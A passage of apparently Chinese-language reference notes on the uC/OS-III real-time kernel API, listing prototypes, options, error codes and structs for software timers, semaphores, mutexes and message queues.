class="comment">DEF_FALSE，删除失败，或者有错误。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">CPU_BOOLEAN <span class="title">OSTmrDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TMR *p_tmr,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>软件定时器结构体：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_tmr</span> &#123;</span><br><span class="line">    OS_OBJ_TYPE          Type;  </span><br><span class="line">    CPU_CHAR            *NamePtr;   </span><br><span class="line">    OS_TMR_CALLBACK_PTR  CallbackPtr;  </span><br><span class="line">    <span class="type">void</span>                *CallbackPtrArg; </span><br><span class="line">    OS_TMR              *NextPtr;   </span><br><span class="line">    OS_TMR              *PrevPtr;</span><br><span class="line">    OS_TICK              Match;   </span><br><span class="line">    OS_TICK              Remain;  </span><br><span class="line">    OS_TICK              Dly;   </span><br><span class="line">    OS_TICK              Period; </span><br><span class="line">    OS_OPT               Opt; </span><br><span class="line">    OS_STATE             State;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_TMR              *DbgPrevPtr;</span><br><span class="line">    OS_TMR              *DbgNextPtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="多值信号量"><a href="#多值信号量" class="headerlink" title="多值信号量"></a>多值信号量</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个多值信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_CREATE_ISR 在中断中调用该函数</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 在调用OSSafetyCriticalStart()函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_NAME p_name 为空指针</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 信号量已经被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 是个空指针</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 已被初始化到另一种对象类型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSemCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,    <span class="comment">// 多值信号量指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name, <span class="comment">// 多值信号量名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM_CTR cnt,   <span class="comment">// 资源数目。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">发布多值信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_1 发布给等待该信号量中最高优先级的任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_ALL 发布给等待该信号量的所有任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_1 |OS_OPT_POST_NO_SCHED发布给等待该信号量中最高优先级的任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_ALL |OS_OPT_POST_NO_SCHED发布给等待该信号量的所有任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是多值信号量类型对象</span></span><br><span class="line"><span class="comment">OS_ERR_SEM_OVF 该发布将导致了信号量的计数值溢出</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，有错误。</span></span><br><span class="line"><span class="comment">其他值，信号量的计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_SEM_CTR <span class="title">OSSemPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待一个多值信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果不能立即获得信号量，就堵塞当前任务，继续等待信号量。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果不能立即获得信号量，不堵塞当前任务，不继续等待信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，获得信号量。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_DEL p_sem 被删除。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是信号量类型对象。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID opt 非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被另一个任务中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_STATUS_INVALID 等待状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，信号量的当前计数值为0，或有错误。</span></span><br><span class="line"><span class="comment">其他值，信号量的当前计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">OS_SEM_CTR <span class="title">OSSemPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,   <span class="comment">// 等待超时时间（单位：时钟节拍），0代表无期限等待。opt 为OS_OPT_PEND_BLOCKING 时该参数才起作用。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,   <span class="comment">// 时间戳，用于存储信号量最后一次被发布的时间戳，或者等待被中止的时间戳，或者信号量被删除时的时间戳，具体返回哪个时间戳，要根据返回的p_err 判断。该参数可以为NULL，表示用户不需要获得时间戳。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止对一个多值信号量的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 只中止该信号量等待列表中的最高优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL 中止该信号量等待列表中的所有优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1|OS_OPT_POST_NO_SCHED  只中止该信号量等待列表中的最高优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL|OS_OPT_POST_NO_SCHED  中止该信号量等待列表中的所有优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是多值信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 没有任务在等待该信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该信号量，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，被中止的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSSemPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个多值信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_NO_PEND 如果没有任务等待p_sem，才删除p_sem。</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_ALWAYS 必须删除p_sem。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_DEL_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是多值信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_WAITING 还有任务在等待该信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该信号量，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，信号量被删除前等待其的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSSemDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设置多值信号量的计数值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_SET_ISR 函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是多值信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_WAITING 还有任务在等待p_sem。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSSemSet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM *p_sem,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_SEM_CTR cnt,   <span class="comment">// 要设置的信号量计数值。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>


<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_sem</span> &#123;    </span><br><span class="line">    OS_OBJ_TYPE          Type;   </span><br><span class="line">    CPU_CHAR            *NamePtr; </span><br><span class="line">    OS_PEND_LIST         PendList;   </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_SEM              *DbgPrevPtr;</span><br><span class="line">    OS_SEM              *DbgNextPtr;</span><br><span class="line">    CPU_CHAR            *DbgNamePtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    OS_SEM_CTR           Ctr;</span><br><span class="line">    CPU_TS               TS;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="互斥信号量"><a href="#互斥信号量" class="headerlink" title="互斥信号量"></a>互斥信号量</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个互斥信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_CREATE_ISR 在中断中调用该函数</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 在调用OSSafetyCriticalStart() 函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_NAME p_name 为空指针</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 信号量已经被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_mutex 是个空指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSMutexCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MUTEX *p_mutex,  <span class="comment">// 互斥信号量指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,   <span class="comment">// 互斥信号量名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">释放互斥信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NONE 释放信号量后，如果信号量可用，而且有任务正在等待，就（默认）进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_NO_SCHED 释放信号量后，如果信号量可用，而且有任务正在等待，不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_MUTEX_NESTING p_mutex 被嵌套。</span></span><br><span class="line"><span class="comment">OS_ERR_MUTEX_NOT_OWNER 当前任务不持有p_mutex。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_mutex 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_mutex 不是多值信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_POST_ISR 在中断中释放多值信号量。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSMutexPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MUTEX *p_mutex,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">申请一个互斥信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果不能立即获得信号量，就堵塞当前任务，继续等待信号量。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果不能立即获得信号量，不堵塞当前任务，不继续等待信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，获得信号量。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_DEL p_sem 被删除。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_sem 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_sem 不是信号量类型对象。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID opt 非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被另一个任务中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_STATUS_INVALID 等待状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，有错误。</span></span><br><span class="line"><span class="comment">其他值，信号量的计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSMutexPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MUTEX *p_mutex,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,   <span class="comment">// 等待超时时间（ 单位： 时钟节拍）， 0 代表无期限等待。opt 为OS_OPT_PEND_BLOCKING 时该参数才起作用。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_TS *p_ts,  <span class="comment">// 时间戳</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中止对一个互斥信号量的等待。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 只中止该信号量等待列表中的最高优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL 中止该信号量等待列表中的所有优先级任务。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_1 |OS_OPT_POST_NO_SCHED只中止该信号量等待列表中的最高优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_ABORT_ALL |OS_OPT_POST_NO_SCHED中止该信号量等待列表中的所有优先级任务，但不进行任务调度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_mutex 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_mutex 不是多值信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT_NONE 没有任务在等待该信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该信号量，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，被中止的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSMutexPendAbort</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MUTEX *p_mutex,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个互斥信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_NO_PEND 如果没有任务等待p_mutex，才删除p_mutex。</span></span><br><span class="line"><span class="comment">OS_OPT_DEL_ALWAYS 必须删除p_mutex。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误。</span></span><br><span class="line"><span class="comment">OS_ERR_DEL_ISR 该函数在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_mutex 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_mutex 不是互斥信号量类型。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项非法。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 持有信号量任务状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_WAITING 还有任务在等待该信号量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">0，没有任务在等待该信号量，或者有错误产生。</span></span><br><span class="line"><span class="comment">&gt;0，信号量被删除前等待其的任务数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_OBJ_QTY <span class="title">OSMutexDel</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MUTEX *p_mutex,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">os_mutex</span> &#123;        </span><br><span class="line">    OS_OBJ_TYPE          Type; </span><br><span class="line">    CPU_CHAR            *NamePtr;</span><br><span class="line">    OS_PEND_LIST         PendList;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_CFG_DBG_EN &gt; 0u</span></span><br><span class="line">    OS_MUTEX            *DbgPrevPtr;</span><br><span class="line">    OS_MUTEX            *DbgNextPtr;</span><br><span class="line">    CPU_CHAR            *DbgNamePtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    OS_TCB              *OwnerTCBPtr;</span><br><span class="line">    OS_PRIO              OwnerOriginalPrio;</span><br><span class="line">    OS_NESTING_CTR       OwnerNestingCtr; </span><br><span class="line">    CPU_TS               TS;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个消息队列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 无错误</span></span><br><span class="line"><span class="comment">OS_ERR_CREATE_ISR 在中断中调用该函数</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 在调用OSSafetyCriticalStart() 函数后创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_NAME p_name 为空指针</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 该消息队列已经被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 是个空指针</span></span><br><span class="line"><span class="comment">OS_ERR_Q_SIZE max_qty 为0.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSQCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,         <span class="comment">// 消息队列指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,  <span class="comment">// 消息队列名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MSG_QTY max_qty, <span class="comment">// 最大消息数目。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">向消息队列发布一个消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FIFO 把消息发布到队列的入口端，并且只唤醒一个等待任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_LIFO 把消息发布到队列的出口端，并且只唤醒一个等待任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FIFO |OS_OPT_POST_ALL 把消息发布到队列的入口端，并且唤醒全部等待任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_LIFO |OS_OPT_POST_ALL 把消息发布到队列的出口端，并且唤醒全部</span></span><br><span class="line"><span class="comment">等待任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_FIFO |OS_OPT_POST_NO_SCHED 把消息发布到队列的入口端；只唤醒一个等待任务；不进行任务调度，继续运行当前任务。</span></span><br><span class="line"><span class="comment">OS_OPT_POST_LIFO |OS_OPT_POST_NO_SCHED 把消息发布到队列的出口端；只唤醒一个等待任务；不进行任务调度，继续运行当前任</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 调用成功，消息被发布了。</span></span><br><span class="line"><span class="comment">OS_ERR_MSG_POOL_EMPTY 消息池没可用消息。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_q 不是消息队列类型。</span></span><br><span class="line"><span class="comment">OS_ERR_Q_MAX 消息队列已满。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSQPost</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_void,   <span class="comment">// 消息指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_MSG_SIZE msg_size,   <span class="comment">// 消息大小（字节）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">等待一个消息队列的消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_BLOCKING 如果不能立即获得消息，就堵塞当前任务，继续等待消息。</span></span><br><span class="line"><span class="comment">OS_OPT_PEND_NON_BLOCKING 如果不能立即获得消息，不堵塞当前任务，不继续等待消息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误，任务获得消息。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL p_q 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_PTR_INVALID p_msg_size 为空。</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_q 不是消息队列类型对象。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ABORT 等待被中止。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_ISR 在中断中被调用。</span></span><br><span class="line"><span class="comment">OS_ERR_PEND_WOULD_BLOCK 缺乏堵塞。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁。</span></span><br><span class="line"><span class="comment">OS_ERR_STATUS_INVALID 等待状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TIMEOUT 等待超时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">!= (void *)0，接收到的消息的指针（首地址）。</span></span><br><span class="line"><span class="comment">== (void *)0，接收到一个空消息，或者没接收到消息，或者所等待的消息队列不存在，或者用户传给p_q 的不是消息队列类型的对象。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">OSQPend</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_Q *p_q,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK timeout,    <span class="comment">// 等待超时时间</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,          </span></span></span><br><span class="line"><span class="params"><span class="function">    